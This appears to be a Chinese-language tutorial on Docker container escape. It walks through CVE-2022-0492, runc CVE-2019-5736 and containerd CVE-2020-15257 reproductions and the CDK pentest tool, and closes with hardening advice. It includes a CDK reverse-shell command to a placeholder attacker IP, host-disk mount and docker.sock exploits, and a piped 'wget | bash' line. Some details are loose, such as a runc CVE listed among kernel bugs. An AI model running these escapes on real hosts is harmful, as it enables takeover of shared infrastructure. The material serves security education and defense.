@@ -1,0 +1,245 @@
+摘要
+
+随着云原生技术的普及，Docker容器已成为应用部署的主流方式。然而，容器并非绝对的安全边界，容器逃逸攻击能够突破隔离，直接威胁宿主机及整个基础设施。本文从理论原理出发，结合真实漏洞复现和自动化工具CDK的实践，深入探讨Docker容器逃逸的两大类常见攻击面——内核漏洞和容器运行时版本漏洞，最后给出有效的防御建议，帮助读者构建更安全的容器环境。
+
+引言
+
+云原生架构的兴起使得容器化部署成为常态，但随之而来的安全挑战也日益突出。容器逃逸是指攻击者从容器内部突破隔离，获取宿主机权限的过程，是云原生攻防中的关键环节。攻击者通常利用内核漏洞、容器运行时漏洞或配置缺陷实现逃逸。本文将通过理论分析与实验操作，展示从漏洞发现到利用的全过程，并引入CDK自动化工具提升渗透效率，最后从防御角度提出加固措施。
+
+---
+
+一、Docker容器安全基础
+
+1.1 容器隔离机制
+
+Docker容器通过Linux内核的Namespace、Cgroups和Capabilities实现资源隔离与权限控制：
+
+· Namespace：隔离进程、网络、文件系统等视图。
+· Cgroups：限制资源使用（CPU、内存等）。
+· Capabilities：拆分root权限，仅赋予必要能力。
+
+1.2 容器逃逸的定义与途径
+
+容器逃逸指攻击者突破上述隔离，在宿主机上执行任意代码。常见途径包括：
+
+· 内核漏洞：利用内核提权漏洞突破Namespace限制。
+· 容器运行时漏洞：攻击runc、containerd等组件的设计缺陷。
+· 配置不当：如特权容器、挂载/var/run/docker.sock等。
+
+本文聚焦于内核漏洞和运行时版本漏洞的利用，并结合CDK工具实现自动化检测与攻击。
+
+---
+
+二、内核漏洞导致的容器逃逸
+
+2.1 漏洞原理
+
+内核漏洞逃逸的本质是利用宿主机内核的权限提升漏洞，在容器内以root身份执行恶意代码后，通过系统调用或内核模块绕过Namespace隔离。由于容器与宿主机共享内核，一旦内核被攻破，隔离即失效。
+
+2.2 典型内核漏洞清单
+
+以下为近年来影响广泛的内核逃逸漏洞：
+
+· CVE-2016-5195（脏牛）：竞态条件导致任意文件写权限。
+· CVE-2019-16884：runc符号链接挂载绕过。
+· CVE-2021-3493：overlayfs文件系统权限绕过。
+· CVE-2021-22555：Netfilter堆溢出提权。
+· CVE-2022-0492：cgroup v1特性绕过权限检查。
+· CVE-2022-0847（脏管道）：管道内核漏洞覆盖任意文件。
+· CVE-2022-23222：eBPF验证器整数溢出。
+
+2.3 漏洞分析：CVE-2022-0492
+
+以CVE-2022-0492为例，该漏洞源于cgroup v1的release_agent机制未充分校验权限。容器内若拥有CAP_SYS_ADMIN能力（常见于特权容器），可通过写入release_agent文件并触发cgroup释放，在宿主机上执行任意命令。
+
+利用思路：
+
+1. 在容器内创建cgroup并启用release_agent。
+2. 编写恶意脚本并指定为release_agent。
+3. 触发cgroup释放，宿主机执行恶意脚本。
+
+复现步骤（简化）：
+
+```bash
+# 容器内操作
+mount -t cgroup -o memory cgroup /mnt
+echo 1 > /mnt/foo/release_agent
+# 利用脚本逃逸
+```
+
+2.4 防御建议
+
+· 及时更新内核至安全版本。
+· 避免使用特权容器，移除不必要的CAP_SYS_ADMIN能力。
+· 启用cgroup v2（更严格的权限控制）。
+
+---
+
+三、容器运行时版本漏洞逃逸
+
+容器运行时组件（如Docker、containerd）自身也可能存在漏洞，攻击者可利用这些漏洞直接逃逸。
+
+3.1 CVE-2019-5736：runc容器逃逸
+
+漏洞原理
+runc是Docker底层的容器运行时。CVE-2019-5736允许恶意容器覆盖宿主机上的runc二进制文件。当管理员使用docker exec进入容器时，runc会执行被篡改的二进制，从而在宿主机上执行任意命令。
+
+影响版本
+
+· Docker <= 18.09.2
+· runc <= 1.0-rc6
+
+复现步骤（基于Ubuntu系统）
+
+1. 安装受影响版本Docker
+   ```bash
+   apt-get update
+   apt-get install -y apt-transport-https ca-certificates curl software-properties-common
+   curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
+   add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
+   apt-get update
+   apt-cache madison docker-ce
+   apt-get install docker-ce=18.06.1~ce~3-0~ubuntu
+   ```
+2. 启动测试容器
+   ```bash
+   docker run -itd --cap-add=SYS_ADMIN ubuntu:latest
+   ```
+3. 编译并上传EXP
+      使用Frichetten/CVE-2019-5736-PoC：
+   ```bash
+   CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
+   docker cp main 7f4793f3ac0cd13:/
+   docker exec -it 7f4793f3ac0cd13 /bin/bash
+   ```
+   在容器内执行./main等待管理员执行docker exec。
+4. 模拟Web应用环境
+      也可使用漏洞环境进行测试：
+   ```bash
+   docker run -it -p 8888:8080 vulhub/struts2:s2-053
+   ```
+
+3.2 CVE-2020-15257：containerd逃逸
+
+漏洞原理
+containerd在启动容器时会创建containerd-shim进程，并通过暴露的API进行通信。当容器使用--net=host时，该API可从容器内部访问，攻击者可利用API控制宿主机的其他容器或执行命令。
+
+影响版本
+
+· containerd < 1.4.3
+· containerd < 1.3.9
+
+复现步骤（基于Ubuntu 16.04 Xenial）
+
+1. 安装受影响版本containerd
+   ```bash
+   apt-get update
+   apt-get install ca-certificates curl software-properties-common
+   curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -
+   add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu xenial stable"
+   apt-get update
+   apt-cache madison docker-ce
+   apt-get install docker-ce=5:19.03.6~3-0~ubuntu-xenial docker-ce-cli=5:19.03.6~3-0~ubuntu-xenial containerd.io=1.2.4-1
+   ```
+2. 启动host网络容器
+   ```bash
+   docker pull ubuntu:18.04
+   docker run -itd --net=host ubuntu:18.04 /bin/bash
+   docker exec -it 5be3ed60f152 /bin/bash
+   ```
+3. 上传CDK自动化逃逸
+   ```bash
+   docker cp cdk_linux_amd64 8e7c27d7b98ca32927:/tmp
+   chmod 777 cdk_linux_amd64
+   ./cdk_linux_amd64 run shim-pwn reverse <attacker_ip> <port>
+   ```
+
+---
+
+四、CDK自动化工具在容器逃逸中的应用
+
+4.1 CDK简介
+
+CDK是一款专为容器环境设计的渗透测试工具，支持检测多种逃逸向量、自动化利用及信息收集。其核心功能包括：
+
+· 检测特权容器、挂载docker.sock、capabilities配置等。
+· 利用CVE-2020-15257等漏洞进行自动逃逸。
+· 反弹Shell、文件提取、持久化后门。
+
+4.2 常规检测
+
+可使用container-escape-check脚本快速评估容器逃逸风险：
+
+```bash
+wget -O- https://raw.githubusercontent.com/teamssix/container-escape-check/main/check.sh | bash
+```
+
+4.3 CDK实战演示
+
+以下演示在不同场景下使用CDK进行逃逸。
+
+场景一：挂载docker.sock的特权容器
+启动容器挂载宿主机docker.sock：
+
+```bash
+docker run --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock -it -p 8888:8080 vulhub/struts2:s2-053
+```
+
+进入容器后，上传CDK并利用docker.sock创建逃逸容器：
+
+```bash
+./cdk_linux_amd64 run docker-sock-exploit
+```
+
+场景二：特权模式容器
+
+```bash
+docker run --rm --privileged=true -it -p 8888:8080 vulhub/struts2:s2-053
+```
+
+在容器内使用CDK检测并利用特权能力：
+
+```bash
+./cdk_linux_amd64 run mount-disk   # 尝试挂载宿主机磁盘
+```
+
+场景三：CVE-2020-15257（host网络）
+如3.2节所示，直接运行shim-pwn模块即可反弹宿主机Shell。
+
+4.4 其他功能
+
+CDK还支持信息收集（如内核版本、环境变量）、指定漏洞利用、修复建议输出等功能，是容器渗透测试的“瑞士军刀”。
+
+---
+
+五、容器逃逸的防御措施
+
+1. 及时更新
+      定期更新内核、Docker、containerd至最新安全版本，避免已知漏洞。
+2. 最小权限原则
+   · 避免使用--privileged，按需添加--cap-add。
+   · 禁止挂载/var/run/docker.sock等敏感文件。
+   · 避免使用--net=host，除非绝对必要。
+3. 运行时加固
+   · 启用Seccomp、AppArmor/SELinux限制系统调用。
+   · 使用用户命名空间（user namespace）重映射容器内root。
+   · 考虑使用gVisor、Kata Containers等安全容器。
+4. 监控与审计
+   · 部署Falco、Sysdig等运行时安全监控工具，检测异常行为。
+   · 定期扫描容器镜像和运行环境漏洞（如Trivy、Clair）。
+
+---
+
+结论
+
+容器逃逸攻击是云原生环境中的重大威胁，攻击者可以利用内核漏洞、运行时漏洞或配置缺陷轻松突破隔离。本文通过理论分析与实战复现，展示了从漏洞原理到利用的完整链条，并介绍了CDK工具如何提升渗透效率。防御者必须建立纵深防御体系，持续关注安全动态，及时修补漏洞并遵循最小权限原则，才能有效降低逃逸风险。
+
+---
+
+参考文献
+
+· CVE-2016-5195 Dirty Cow
+· CVE-2019-5736 PoC
+· CVE-2020-15257
+· CDK - Container Defense Kit
+· container-escape-check
